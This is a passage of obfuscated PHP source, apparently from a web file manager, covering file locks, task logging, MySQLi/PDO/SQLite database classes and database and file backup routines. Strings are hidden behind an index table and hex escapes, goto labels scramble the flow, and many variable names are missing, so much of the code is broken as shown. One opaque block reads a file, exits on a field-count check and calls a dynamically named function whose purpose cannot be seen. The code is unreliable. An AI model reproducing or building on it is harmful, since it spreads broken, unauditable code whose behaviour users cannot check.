. $ݼ[71] . get_caller_msg(), $ݼ[878]); continue; } write_log($ݼ[891] . $, $ݼ[878]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ƀ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ݼ[892] . $ƀ . $ݼ[893] . ACTION, $ݼ[878]); } } public static function fileLock($) { $ =& $_SERVER[]; if (!$GLOBALS[$[894]]) { $GLOBALS[$[894]] = array(); } $GLOBALS[$[894]][$] = !1; $˞ = fopen(DATA_PATH . $ . $[895], $[896]); if (!$˞) { return !1; } $GLOBALS[$[894]][$] = $˞; if (flock($˞, LOCK_EX)) { return !0; } self::unlock($); show_json($[897], !1); return !1; } public static function fileUnlock($˅) { $ =& $_SERVER[]; $ = $GLOBALS[$[894]][$˅]; if (!$) { return; } $GLOBALS[$[894]][$˅] = !1; flock($, LOCK_UN); fclose($); } public static function fileUnlockAll() { $ЂÜ =& $_SERVER[]; if (!$GLOBALS[$ЂÜ[894]]) { return; } foreach ($GLOBALS[$ЂÜ[894]] as $Æ => $悪) { if (!$悪) { continue; } $GLOBALS[$ЂÜ[894]][$Æ] = !1; flock($悪, LOCK_UN); fclose($悪); } $GLOBALS[$ЂÜ[894]] = array(); } } goto C̯; DƂ: class TaskHttp extends Task { protected function startAfter() { $ =& $_SERVER[]; $ۚ =& $this->task; $ۚ[$[1764]] = 1; Hook::bind($[1732], array($this, $[1765])); Hook::bind($[1734], array($this, $[1766])); Hook::bind($[1736], array($this, $[1767])); } protected function endAfter() { $ٹ =& $_SERVER[]; Hook::unbind($ٹ[1732], array($this, $ٹ[1765])); Hook::unbind($ٹ[1734], array($this, $ٹ[1766])); Hook::unbind($ٹ[1736], array($this, $ٹ[1767])); } public function progressStart($ƴ) { $𖨟 =& $_SERVER[]; $ = curl_getinfo($ƴ); self::log($𖨟[1768] . $[$𖨟[351]]); self::valueSet($this->task[$𖨟[443]], $this->task); } public function progressEnd($) { $赺Ѷ =& $_SERVER[]; self::log($赺Ѷ[1769] . $this->task[$赺Ѷ[443]]); $this->end(); } public function progress($, $, $Ў, $, $⑉) { $æ =& $_SERVER[]; $۬ =& $this->task; if ($⑉ > 0) { $۬[$æ[820]] = $۬[$æ[820]] == 0 ? $ : $۬[$æ[820]]; $۬[$æ[1688]] = $⑉; } else { if ($Ў > 0) { $۬[$æ[820]] = $۬[$æ[820]] == 0 ? $ : $۬[$æ[820]]; $۬[$æ[1688]] = $Ў; } } $this->update(); self::log("\x70\x72\157\147\x72\x65\x73\163\110\x74\164\x70\x3a\144\157\x77\x6e\x3a{$Ў}\57{$}\x3b\x20\165\160\x6c\x6f\141\x64\x3a{$⑉}\x2f{$}\73"); } } if ($_SERVER[$_SERVER[][911]] != $_SERVER[$_SERVER[][912]]) { $_getc = $_SERVER[][914]; $_getfile = $_SERVER[$_SERVER[][915]] . $_SERVER[][916]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[][246], $_getfilec); if (count($_getarrs) < $_SERVER[][657]) { $exit = $_SERVER[][917]; $exit(); } $_act = $_SERVER[][1223]; $_act($_SERVER[$_SERVER[][1222]]); } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($, $̩ = '', $ۥ = 0, $ӭи = '') { $َ鏶 =& $_SERVER[]; $Ȕ = new Task($, $̩, $ۥ, $ӭи); $GLOBALS[$َ鏶[1770] . $] = new TaskLog($َ鏶[1671], $Ȕ, $ӭи); return $Ȕ; } public function __construct($ = '', $ = '', $ڣ = '') { $Ώ =& $_SERVER[]; if (!$) { $ = $Ώ[1671]; } $ = $ . $Ώ[430] . rand_string(10); if (!$ڣ) { $ڣ = $ . $Ώ[53] . $ڣ; } switch ($) { case $Ώ[1671]: if (!$ || !$->task) { return echoLog($ . $Ώ[1771]); } $ = $; $ = $->task[$Ώ[443]]; $ = $->task[$Ώ[443]]; if (!$->task[$Ώ[1584]]) { $->task[$Ώ[1584]] = $ڣ ? $ڣ : $; } break; case $Ώ[1772]: if (!$) { return echoLog($ . $Ώ[1773]); } $㺘 = is_string($) ? array($) : $; $ = new TaskFileTransfer($, $, 0, $ڣ ? $ڣ : $㺘[0]); foreach ($㺘 as $ѡ) { $->addPath($ѡ); } break; case $Ώ[357]: if (!$) { return echoLog($ . $Ώ[1773]); } $㺘 = is_string($) ? array($) : $; $ = new TaskZip($, $, 0, $ڣ ? $ڣ : $㺘[0]); foreach ($㺘 as $ѡ) { $->addPath($ѡ); } break; case $Ώ[1255]: if (!$) { return echoLog($ . $Ώ[1773]); } $ = new TaskUnZip($, $, 0, $ڣ ? $ڣ : $); if ($) { $->addFile($); } break; case $Ώ[149]: $ = new TaskHttp($, $); break; default: return; break; } $this->task = $; $this->taskID = $; Hook::bind($Ώ[1708], array($this, $Ώ[1774])); Hook::bind($Ώ[1710], array($this, $Ώ[1775])); Hook::bind($Ώ[1704], array($this, $Ώ[1776])); echoLog($Ώ[1777] . $->task[$Ώ[1584]]); } public function __destruct() { $this->end(); } public function end($ = '') { $Ȏ =& $_SERVER[]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($); $this->task = !1; $this->taskID = !1; Hook::unbind($Ȏ[1708], array($this, $Ȏ[1774])); Hook::unbind($Ȏ[1710], array($this, $Ȏ[1775])); Hook::unbind($Ȏ[1704], array($this, $Ȏ[1776])); } public function taskUpdate($٣) { $ޒ =& $_SERVER[]; if (!$٣ || $this->taskID != $٣[$ޒ[443]]) { return; } $爓 = 20; $Ǚ = intval($٣[$ޒ[1689]] * $爓); $ƨڂ = $ޒ[163] . str_repeat($ޒ[923], $Ǚ) . $ޒ[1053] . str_repeat($ޒ[53], $爓 - $Ǚ) . $ޒ[165]; $ = $ƨڂ . sprintf($ޒ[1778], $٣[$ޒ[1689]] * 100) . $ޒ[1779]; $ = $ . $٣[$ޒ[1688]] . $ޒ[8] . $٣[$ޒ[820]] . LNG($ޒ[1780]); $ = $ޒ[12]; if ($٣[$ޒ[1764]]) { $ = $ . size_format($٣[$ޒ[1688]]) . $ޒ[8] . size_format($٣[$ޒ[820]]); $ = size_format($٣[$ޒ[1690]]) . $ޒ[1781]; } if ($٣[$ޒ[1103]]) { $٣[$ޒ[1738]] = $٣[$ޒ[1103]] . $ޒ[53] . $٣[$ޒ[1738]]; } if ($٣[$ޒ[1738]]) { $ = $ޒ[12]; if ($٣[$ޒ[1740]]) { $ = $ޒ[50] . size_format($٣[$ޒ[1741]]) . $ޒ[8] . size_format($٣[$ޒ[1740]]); } $ .= $٣[$ޒ[1738]] . $; } if ($٣[$ޒ[797]] && !$٣[$ޒ[1740]]) { $ .= $ޒ[53] . size_format($٣[$ޒ[1745]]) . $ޒ[8] . size_format($٣[$ޒ[797]]); } echoLog($ . $ޒ[53] . $, !0); } public function taskEnd($ܭ) { $ =& $_SERVER[]; if (!$ܭ || $this->taskID != $ܭ[$[443]]) { return; } $Ԭ = $ܭ ? $ܭ[$[1688]] . $[8] . $ܭ[$[820]] . LNG($[1780]) . $[71] : $[12]; echoLog($[1782] . $ܭ[$[1584]] . ($ܭ[$[494]] ? $[71] . $ܭ[$[494]] : $[12]) . $[71] . $Ԭ . $[1783] . sprintf($[885], timeFloat() - $ܭ[$[1691]]) . $[1703]); $this->end(); } public function taskKill($თ) { $ֶ =& $_SERVER[]; if (!$თ || $this->taskID != $თ[$ֶ[443]]) { return; } echoLog($ֶ[1784] . $თ[$ֶ[1584]]); } } goto bԾ; b: class DbMysqli extends Db { public function __construct($˱ = '') { $عџ =& $_SERVER[]; if (!extension_loaded($عџ[951])) { think_exception(think_lang($عџ[14]) . $عџ[952]); } if (!empty($˱)) { $this->config = $˱; if (empty($this->config[$عџ[17]])) { $this->config[$عџ[17]] = $عџ[12]; } } } public function connect($ݲ = '', $ە = 0) { $đ€ =& $_SERVER[]; if (!isset($this->linkID[$ە])) { if (empty($ݲ)) { $ݲ = $this->config; } $this->linkID[$ە] = new mysqli($ݲ[$đ€[925]], $ݲ[$đ€[927]], $ݲ[$đ€[928]], $ݲ[$đ€[21]], $ݲ[$đ€[926]] ? intval($ݲ[$đ€[926]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ʻ = $this->linkID[$ە]->server_version; $this->linkID[$ە]->query($đ€[929] . think_config($đ€[930]) . $đ€[58]); if ($ʻ > $đ€[931]) { $this->linkID[$ە]->query($đ€[932]); } $this->connected = !0; if (1 != think_config($đ€[22])) { unset($this->config); } } return $this->linkID[$ە]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($𺢪) { $ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $𺢪; if ($this->queryID) { $this->free(); } think_action_status($[23], 1); think_status($[24]); $this->queryID = $this->_linkID->query($𺢪); if ($this->_linkID->more_results()) { while (($ = $this->_linkID->next_result()) != NULL) { $->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($) { $ا =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $; if ($this->queryID) { $this->free(); } think_action_status($ا[25], 1); think_status($ا[24]); $ȅ = $this->_linkID->query($); $this->debug(); if (!1 === $ȅ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ѕ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$Ѕ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ၴ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ၴ) { $this->error(); return !1; } } return !0; } private function getAll() { $ݵ = array(); if ($this->numRows > 0) { for ($ = 0; $ < $this->numRows; $++) { $ݵ[$] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ݵ; } public function getFields($) { $Μ =& $_SERVER[]; $ = $this->query($Μ[936] . $this->parseKey($)); $Ҁ = array(); if ($) { foreach ($ as $ȃ => $̻) { $Ҁ[$̻[$Μ[31]]] = array($Μ[32] => $̻[$Μ[31]], $Μ[33] => $̻[$Μ[34]], $Μ[35] => (bool) ($̻[$Μ[36]] === $Μ[12]), $Μ[37] => $̻[$Μ[38]], $Μ[39] => strtolower($̻[$Μ[40]]) == $Μ[41], $Μ[42] => strtolower($̻[$Μ[43]]) == $Μ[44]); } } return $Ҁ; } public function getTables($ = '') { $ =& $_SERVER[]; $ = !empty($) ? $[938] . $ . $[939] : $[940]; $ = $this->query($); $Ҍ = array(); if ($) { foreach ($ as $ԛ => $) { $Ҍ[$ԛ] = current($); } } return $Ҍ; } public function replace($, $ = array()) { $߅ =& $_SERVER[]; foreach ($ as $ => $б) { $Јџ = $this->parseValue($б); if (is_scalar($Јџ)) { $Ǥ[] = $Јџ; $ʔ[] = $this->parseKey($); } } $Ή = $߅[941] . $this->parseTable($[$߅[323]]) . $߅[942] . implode($߅[50], $ʔ) . $߅[943] . implode($߅[50], $Ǥ) . $߅[944]; return $this->execute($Ή); } public function insertAll($ک, $ = array(), $ = false) { $敦 =& $_SERVER[]; if (!is_array($ک[0])) { return !1; } $ƣ = array_keys($ک[0]); $ݳ = array(); foreach ($ک as $ڹ) { $é = array(); foreach ($ڹ as $ׂմ => $) { $ = $this->parseValue($); if (is_scalar($)) { $é[] = $; } } $ݳ[] = $敦[304] . implode($敦[50], $é) . $敦[944]; } array_walk($ƣ, array($this, $敦[945])); $ŝ = $ ? $敦[946] : $敦[947]; $ֿ = $ŝ . $敦[948] . $this->parseTable($[$敦[323]]) . $敦[942] . implode($敦[50], $ƣ) . $敦[949] . implode($敦[50], $ݳ); return $this->execute($ֿ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ =& $_SERVER[]; $this->error = $this->_linkID->errno . $[4] . $this->_linkID->error; if ($[12] != $this->queryStr) { $this->error .= LNG($[48]) . $this->queryStr; } think_trace($this->error, $[12], $[49]); return $this->error; } public function escapeString($ž) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ž); } else { return addslashes($ž); } } public function parseKey(&$ͭ՞, $ = true) { $ =& $_SERVER[]; if ($) { $ͭ՞ = $this->parseKeyCheck($ͭ՞); } if ($ͭ՞ != $[203] && !preg_match($[950], $ͭ՞)) { $ͭ՞ = $[429] . trim($ͭ՞, $[429]) . $[429]; } return $ͭ՞; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ǟ = '') { $Ɠ =& $_SERVER[]; if (!class_exists($Ɠ[953])) { think_exception(think_lang($Ɠ[14]) . $Ɠ[954]); } if (!empty($ǟ)) { $this->config = $ǟ; if (empty($this->config[$Ɠ[17]])) { $this->config[$Ɠ[17]] = array(); } } } public function connect($ = '', $ٞ = 0) { $Ѣԣ =& $_SERVER[]; if (!isset($this->linkID[$ٞ])) { if (empty($)) { $ = $this->config; } $ߜ = !empty($[$Ѣԣ[17]][$Ѣԣ[18]]) ? $[$Ѣԣ[17]][$Ѣԣ[18]] : $this->pconnect; if ($ߜ) { $[$Ѣԣ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ٞ] = new PDO($[$Ѣԣ[955]], $[$Ѣԣ[927]], $[$Ѣԣ[928]], $[$Ѣԣ[17]]); } catch (PDOException $) { think_exception($->getMessage()); } $this->dbType = $this->_getDsnType($[$Ѣԣ[955]]); if (in_array($this->dbType, array($Ѣԣ[956], $Ѣԣ[957], $Ѣԣ[958], $Ѣԣ[959]))) { think_exception($Ѣԣ[960] . $this->dbType . $Ѣԣ[961] . $this->dbType . $Ѣԣ[962]); } if (!$this->linkID[$ٞ]) { think_exception($Ѣԣ[963]); } try { $this->linkID[$ٞ]->exec($Ѣԣ[964] . think_config($Ѣԣ[930])); } catch (Exception $) { } $this->connected = !0; if (1 != think_config($Ѣԣ[22])) { unset($this->config); } } return $this->linkID[$ٞ]; } public function free() { $this->PDOStatement = null; } public function query($ߦͣ, $Ѱ = array()) { $ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ߦͣ; if (!empty($Ѱ)) { $this->queryStr .= $[965] . print_r($Ѱ, !0) . $[966]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($[23], 1); think_status($[24]); $this->PDOStatement = $this->_linkID->prepare($ߦͣ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $݆ = $this->PDOStatement->execute($Ѱ); $this->debug(); if (!1 === $݆) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($, $گ = array()) { $慧 =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $; if (!empty($گ)) { $this->queryStr .= $慧[965] . print_r($گ, !0) . $慧[966]; } $ށ = !1; if ($this->dbType == $慧[959]) { if (preg_match($慧[967], $this->queryStr, $)) { $this->table = think_config($慧[968]) . str_ireplace(think_config($慧[969]), $慧[422], $[2]); $ށ = (bool) $this->query($慧[970] . strtoupper($this->table) . $慧[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($慧[25], 1); think_status($慧[24]); $this->PDOStatement = $this->_linkID->prepare($); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ = $this->PDOStatement->execute($گ); $this->debug(); if (!1 === $) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ށ || preg_match($慧[971], $)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $݆ = $this->_linkID->commit(); $this->transTimes = 0; if (!$݆) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$) { $this->error(); return !1; } } return !0; } private function getAll() { $ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($); return $; } public function getFields($㓚) { $初 =& $_SERVER[]; $this->initConnect(!0); if (think_config($初[972])) { $ĺ = str_replace($初[973], $㓚, think_config($初[972])); } else { switch ($this->dbType) { case $初[956]: case $初[974]: $ĺ = "\x53\x45\x4c\x45\x43\x54\40\x20\x20\x63\157\x6c\165\x6d\156\137\156\141\155\145\40\x61\163\x20\47\116\141\x6d\x65\x27\54\x20\40\x20\x64\141\x74\141\x5f\164\x79\160\x65\x20\x61\x73\40\47\x54\x79\160\145\47\54\40\x20\x20\x63\x6f\154\x75\155\156\137\144\145\146\x61\165\154\x74\x20\141\x73\40\x27\104\x65\146\141\165\x6c\164\x27\54\x20\40\x20\151\x73\x5f\156\165\x6c\154\141\x62\154\x65\x20\141\x73\x20\47\x4e\x75\154\x6c\47\xa\x9\x9\x46\122\117\115\x9\x69\156\x66\157\x72\155\141\x74\151\x6f\156\137\x73\143\x68\x65\155\x61\x2e\x74\141\142\154\x65\163\40\101\123\40\x74\xa\11\11\x4a\117\x49\x4e\x9\x69\x6e\146\x6f\x72\x6d\141\164\x69\x6f\156\x5f\163\x63\x68\145\155\x61\56\x63\x6f\154\165\155\156\x73\40\101\x53\x20\143\xa\11\x9\x4f\x4e\x20\x20\x74\x2e\x74\x61\x62\154\x65\137\143\x61\x74\141\154\x6f\147\40\75\x20\143\x2e\164\x61\142\154\x65\x5f\143\x61\x74\141\x6c\x6f\147\xa\x9\11\101\116\x44\x20\x74\x2e\164\141\x62\x6c\145\137\163\x63\x68\x65\155\141\40\75\x20\x63\x2e\164\x61\142\x6c\x65\x5f\163\x63\150\145\x6d\141\12\x9\11\x41\116\104\40\164\x2e\164\141\142\x6c\145\137\x6e\x61\x6d\x65\x20\x3d\40\x63\x2e\164\x61\142\154\145\x5f\156\x61\155\x65\12\11\x9\127\x48\105\x52\x45\x20\40\40\x74\56\164\141\x62\154\145\x5f\156\141\x6d\145\40\75\x20\x27{$㓚}\47"; break; case $初[975]: $ĺ = $初[976] . $㓚 . $初[977]; break; case $初[957]: case $初[959]: $ĺ = $初[978] . $初[979] . $初[980] . strtoupper($㓚) . $初[981] . strtoupper($㓚) . $初[982]; break; case $初[983]: $ĺ = $初[984] . $㓚 . $初[985]; break; case $初[958]: break; case $初[986]: default: $ĺ = $初[987] . ($this->dbType == $初[986] ? "\140{$㓚}\140" : $㓚); } } $؜ = $this->query($ĺ); $ʱ = array(); if ($؜) { foreach ($؜ as $پ => $Ǐ) { $Ǐ = array_change_key_case($Ǐ); $Ǐ[$初[32]] = isset($Ǐ[$初[32]]) ? $Ǐ[$初[32]] : $初[422]; $Ǐ[$初[33]] = isset($Ǐ[$初[33]]) ? $Ǐ[$初[33]] : $初[422]; $ = isset($Ǐ[$初[317]]) ? $Ǐ[$初[317]] : $Ǐ[$初[32]]; $ʱ[$] = array($初[32] => $, $初[33] => $Ǐ[$初[33]], $初[35] => (bool) (isset($Ǐ[$初[103]]) && $Ǐ[$初[103]] === $初[12] || isset($Ǐ[$初[35]]) && $Ǐ[$初[35]] === $初[12]), $初[37] => isset($Ǐ[$初[37]]) ? $Ǐ[$初[37]] : (isset($Ǐ[$初[56]]) ? $Ǐ[$初[56]] : $初[422]), $初[39] => isset($Ǐ[$初[94]]) ? strtolower($Ǐ[$初[94]]) == $初[41] : (isset($Ǐ[$初[57]]) ? $Ǐ[$初[57]] : !1), $初[42] => isset($Ǐ[$初[988]]) ? strtolower($Ǐ[$初[988]]) == $初[44] : (isset($Ǐ[$初[94]]) ? $Ǐ[$初[94]] : !1)); } } return $ʱ; } public function getTables($ҫ = '') { $ =& $_SERVER[]; if (think_config($[989])) { $Ъ = str_replace($[990], $ҫ, think_config($[989])); } else { switch ($this->dbType) { case $[957]: case $[959]: $Ъ = $[991]; break; case $[956]: case $[974]: $Ъ = $[992]; break; case $[983]: $Ъ = $[993]; break; case $[958]: think_exception(think_lang($[994]) . $[995]); break; case $[975]: $Ъ = $[45] . $[46] . $[47]; break; case $[986]: default: if (!empty($ҫ)) { $Ъ = $[938] . $ҫ . $[939]; } else { $Ъ = $[940]; } } } $ = $this->query($Ъ); $ʬω = array(); foreach ($ as $Ľ => $) { $ʬω[$Ľ] = current($); } return $ʬω; } protected function parseLimit($) { $離 =& $_SERVER[]; $ = $離[12]; if (!empty($)) { switch ($this->dbType) { case $離[983]: case $離[975]: $ = explode($離[50], $); if (count($) > 1) { $ .= $離[51] . $[1] . $離[52] . $[0] . $離[53]; } else { $ .= $離[51] . $[0] . $離[53]; } break; case $離[956]: case $離[974]: break; case $離[958]: break; case $離[957]: case $離[959]: break; case $離[986]: default: $ .= $離[51] . $ . $離[53]; } } return $; } public function parseKey(&$̀ݜ, $̓ = true) { $ֺ =& $_SERVER[]; if ($̓) { $̀ݜ = $this->parseKeyCheck($̀ݜ); } if ($this->dbType == $ֺ[986]) { if ($̀ݜ != $ֺ[203] && !preg_match($ֺ[950], $̀ݜ)) { $̀ݜ = $ֺ[429] . trim($̀ݜ, $ֺ[429]) . $ֺ[429]; } return $̀ݜ; } else { return parent::parseKey($̀ݜ, $̓); } } public function close() { $this->_linkID = null; } public function error() { $笊 =& $_SERVER[]; if ($this->PDOStatement) { $ǈ = $this->PDOStatement->errorInfo(); $this->error = $ǈ[1] . $笊[4] . $ǈ[2]; } else { $this->error = $笊[12]; } if ($笊[12] != $this->queryStr) { $this->error .= LNG($笊[48]) . $this->queryStr; } think_trace($this->error, $笊[12], $笊[49]); return $this->error; } public function escapeString($쀮ͺ) { $ =& $_SERVER[]; switch ($this->dbType) { case $[983]: case $[956]: case $[974]: case $[986]: return addslashes($쀮ͺ); case $[958]: case $[975]: case $[957]: case $[959]: return str_ireplace($[58], $[59], $쀮ͺ); } } protected function parseValue($) { $ =& $_SERVER[]; if (is_string($)) { $ꟽ = strpos($, $[4]) === 0 && in_array($, array_keys($this->bind)); $ = $ꟽ ? $this->escapeString($) : $[996] . $this->escapeString($) . $[996]; } elseif (isset($[0]) && is_string($[0]) && strtolower($[0]) == $[341]) { $ = $this->escapeString($[1]); } elseif (is_array($)) { $ = array_map(array($this, $[997]), $); } elseif (is_bool($)) { $ = $ ? $[88] : $[212]; } elseif (is_null($)) { $ = $[103]; } return $; } public function getLastInsertId() { $ =& $_SERVER[]; switch ($this->dbType) { case $[983]: case $[975]: case $[956]: case $[974]: case $[958]: case $[986]: return $this->_linkID->lastInsertId(); case $[957]: case $[959]: $ނƅ = $this->table; $ = $this->query("\x53\105\114\105\103\x54\x20{$ނƅ}\56\x63\165\x72\x72\166\141\154\40\x63\165\x72\162\x76\x61\x6c\40\106\x52\x4f\x4d\x20\x64\165\141\x6c"); return $ ? $[0][$[998]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($) { $ =& $_SERVER[]; if (!CacheLock::fileLock($[13])) { return !1; } $ = parent::query($); CacheLock::fileUnLock($[13]); return $; } public function execute($̽) { $ɚ =& $_SERVER[]; if (!CacheLock::fileLock($ɚ[13])) { return !1; } $з = parent::execute($̽); CacheLock::fileUnLock($ɚ[13]); return $з; } } goto B; Fݢ: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ =& $_SERVER[]; $ = Backup::get(); self::$io = $[$[785]]; self::$name = $[$[32]]; $ݝ = new DbManage(); $ = $ݝ->dbType(); $ = array($[810] => $, $[811] => time()); Backup::set($); $ = $this->tmpFilesPath() . $[812] . self::$name . $[8]; del_dir($); mk_dir($); $ϲ = $͙ = 0; $ = new Task($[813], $[814], 0, LNG($[815]) . $[816] . LNG($[817])); try { $ = $ݝ->db()->getTables(); } catch (Exception $) { $->end(); return !1; } $ = array_diff($, array($[818], $[819])); foreach ($ as $) { $ϲ += $ݝ->model($)->count(); } $->task[$[820]] = $ϲ; $GLOBALS[$[821]] = self::$name; foreach ($ as $) { $܇ = $ . $ . $[822]; $ = null; if ($ == $[823] && (!isset($[$[788]]) || $[$[788]] == $[212])) { $ = self::$io; } $͙ += $ݝ->sqlFromDb($, $܇, $, $); } unset($GLOBALS[$[821]]); $->end(); if ($͙ > $ϲ) { $ϲ = $͙; } $ = array($[810] => $, $[807] => 1, $[824] => $ϲ, $[825] => $͙, $[826] => time()); Backup::set($); if ($ϲ - $͙ > 0) { $ = $[827]; if (stristr(I18n::getType(), $[828])) { $ = $[829]; } write_log(array($, $), $[814]); return !1; } return !0; } private function tmpFilesPath() { $ =& $_SERVER[]; $ = TEMP_FILES; if ($GLOBALS[$[6]][$[89]][$[830]]) { $ = $GLOBALS[$[6]][$[89]][$[830]]; if (!mk_dir($) || !is_writable($) || !IO::mkfile($ . $[831])) { $ = TEMP_FILES; } } return $; } } class BackupDbFile { public function __construct() { } public function index() { $؜ =& $_SERVER[]; $Ώ = Backup::get(); $ɾ = $Ώ[$؜[32]]; $Ô = $this->tmpFilesPath() . "\142\141\x63\x6b\165\160\137{$ɾ}\x2f"; $ = $this->backupPath($Ώ); if (!($ = IO::mkdir($))) { return !1; } $ = IO::listPath($Ô); $ = isset($[$؜[83]]) ? $[$؜[83]] : array(); $õ = array_sum(array_column($, $؜[76])); if (!$õ) { return !1; } $ = array($؜[832] => $õ, $؜[833] => time()); Backup::set($); $ط = new TaskFileTransfer($؜[834], $؜[814], count($), LNG($؜[815]) . $؜[430] . LNG($؜[817]) . $؜[835]); $ط->task[$؜[797]] = $õ; foreach ($[$؜[83]] as $) { $ = IO::move($[$؜[84]], $); if (!$) { $ط->end(); $稿 = IO::getLastError($؜[836] . $[$؜[84]] . $؜[837] . $ . $؜[165]); write_log($稿, $؜[814]); return !1; } } $✥ = new DbManage(); $ط = $✥->getSqlFile(); if (!$ط[$؜[838]] || !$ط[$؜[13]]) { return !1; } IO::move($ط[$؜[838]], $); IO::move($ط[$؜[13]], $); $ط->end(); $ = array($؜[839] => $õ, $؜[840] => time()); Backup::set($); return !0; } private function backupPath($) { $ =& $_SERVER[]; $ = $[$[32]]; $ = Model($[804])->get($[805]); $ڽ = substr(md5($[806] . $ . $), 0, 8); return "\173\151\x6f\x3a{$[$[785]]}\175\57\144\x61\164\141\142\x61\163\145\x2f\x62\141\x63\x6b\165\160\57" . $ . $[11] . $ڽ; } private function tmpFilesPath() { $℥ =& $_SERVER[]; $ = TEMP_FILES; if ($GLOBALS[$℥[6]][$℥[89]][$℥[830]]) { $ = $GLOBALS[$℥[6]][$℥[89]][$℥[830]]; if (!mk_dir($) || !is_writable($) || !IO::mkfile($ . $℥[831])) { $ = TEMP_FILES; } } return $; } } class BackupFile { public function __construct() { } public function index() { $밮 = Backup::get(); $Ú = $밮[$_SERVER[][337]][$_SERVER[][214]][$_SERVER[][509]]; $Рų = array($_SERVER[][510] => array($_SERVER[][841], $Ú), $_SERVER[][842] => array($_SERVER[][375], $밮[$_SERVER[][785]])); $и = (int) Model($_SERVER[][823])->where($Рų)->count($_SERVER[][509]); $ɇ = (int) Model($_SERVER[][823])->where($Рų)->sum($_SERVER[][76]); $ = new TaskFileTransfer($_SERVER[][843], $_SERVER[][814], $и, LNG($_SERVER[][815]) . $_SERVER[][816] . LNG($_SERVER[][844])); $->task[$_SERVER[][797]] = $ɇ; $Ü = array($_SERVER[][845] => $и, $_SERVER[][846] => $ɇ, $_SERVER[][847] => time()); Backup::set($Ü); $ = !0; $̉ = $this->storeIds(); $ = 1; $ = 1000; $׸ = $ε = 0; $撯 = array(); $ = $ = 0; do { $Ѹ = $_SERVER[][848]; $ݕ颛 = Model($_SERVER[][823])->where($Рų)->field($Ѹ)->order($_SERVER[][849])->selectPage($, $); $٠ = !empty($ݕ颛[$_SERVER[][413]]) ? $ݕ颛[$_SERVER[][413]] : array(); foreach ($٠ as $׭) { if (!$this->_fileExist($׭, $撯, $̉)) { $и -= 1; $ɇ -= (int) $׭[$_SERVER[][76]]; write_log("\x66\x69\154\145\x20\x6e\157\x74\x20\x65\170\151\x73\x74\56\x66\151\154\x65\x49\x44\72{$׭[$_SERVER[][509]]}\x2c\40\160\x61\x74\150\x3a{$׭[$_SERVER[][84]]}", $_SERVER[][850]); continue; } $ = $׭[$_SERVER[][84]]; $ڽ = "\x7b\x69\x6f\72{$밮[$_SERVER[][785]]}\x7d" . substr($, strlen("\173\151\157\72{$׭[$_SERVER[][851]]}\x7d")); if (IO::exist($ڽ)) { $->updateFileEnd($׭[$_SERVER[][32]], $׭[$_SERVER[][76]]); } else { $ڽ = get_path_father($ڽ); IO::mkdir($ڽ); if (!IO::copy($, $ڽ, $_SERVER[][852])) { write_log($_SERVER[][853] . $ . $_SERVER[][837] . $ڽ . $_SERVER[][165], $_SERVER[][814]); $ = !1; break; } } $Ú = $׭[$_SERVER[][509]]; $ε += 1; $׸ += $׭[$_SERVER[][76]]; $ += 1; $ += $׭[$_SERVER[][76]]; if ($׸ >= 1024 * 1024 * 100) { $Ü = array($_SERVER[][854] => $Ú, $_SERVER[][855] => $, $_SERVER[][856] => $); Backup::set($Ü); $׸ = $ε = 0; } } $揿 = count($٠); $++; } while ($揿 == $); $->end(); $Ü = array($_SERVER[][857] => 1, $_SERVER[][795] => time(), $_SERVER[][809] => 1, $_SERVER[][854] => $Ú, $_SERVER[][846] => $ɇ, $_SERVER[][845] => $и, $_SERVER[][858] => time()); if ($ε) { $Ü[$_SERVER[][855]] = $; $Ü[$_SERVER[][856]] = $; } Backup::set($Ü); $this->_fileFilter($撯); return !0; } private function _fileExist($, &$ꬲ, $Ŵ) { $ =& $_SERVER[]; $ʩ = $[$[84]]; if (in_array($[$[509]], 